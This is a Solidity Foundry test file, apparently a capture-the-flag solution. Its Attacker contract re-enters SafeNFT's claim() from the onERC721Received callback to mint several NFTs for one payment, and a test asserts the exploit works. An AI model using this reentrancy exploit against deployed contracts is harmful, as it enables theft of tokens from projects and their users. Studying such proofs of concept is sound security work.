// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./SafeNFT.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Attacker is IERC721Receiver {
    SafeNFT public nft;
    uint256 public count;

    constructor(SafeNFT nft_, uint256 count_) {
        nft = nft_;
        count = count_;
    }

    function attack() external payable {
        nft.buyNFT{value: msg.value}();
        nft.claim();

        for (uint256 i; i < count; i++) {
            uint256 tokenId = nft.tokenOfOwnerByIndex(address(this), 0);
            nft.transferFrom(address(this), msg.sender, tokenId);
        }
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        if (nft.balanceOf(address(this)) < count) {
            nft.claim();
        }

        return IERC721Receiver.onERC721Received.selector;
    }
}

contract SafeNFTTest is Test {
    uint256 public constant COUNT = 3;

    SafeNFT internal _nft;

    function setUp() public {
        _nft = new SafeNFT("NFT", "NFT", 0.01e18);
    }

    function test_attack() public {
        uint256 price = uint256(vm.load(address(_nft), bytes32(uint256(10))));

        Attacker attacker = new Attacker(_nft, COUNT);
        attacker.attack{value: price}();

        assertGe(_nft.balanceOf(address(this)), COUNT);
    }
}